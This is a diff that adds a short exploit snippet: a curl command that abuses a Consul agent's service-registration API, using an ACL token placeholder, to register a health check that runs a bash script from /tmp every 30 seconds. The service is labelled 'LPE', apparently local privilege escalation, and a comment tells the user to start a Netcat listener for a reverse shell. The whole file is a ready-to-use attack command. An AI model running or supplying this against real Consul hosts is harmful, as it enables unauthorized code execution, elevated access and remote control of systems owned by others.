@@ -1,0 +1,5 @@
+# This command is to be run in terminal # 
+
+# Don't forget to setup a listener (Netcat) for a reverse shell :) #
+
+curl --header "X-Consul-Token: #<REPLACE_WITH_YOUR_ACL_TOKEN_HERE>#" --request PUT -d '{"ID": "LPE", "Name": "LPE", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/bin/bash", "/tmp/bash_shell.sh"], "interval": "30s", "timeout": "100000s"}}' http://127.0.0.1:8500/v1/agent/service/register
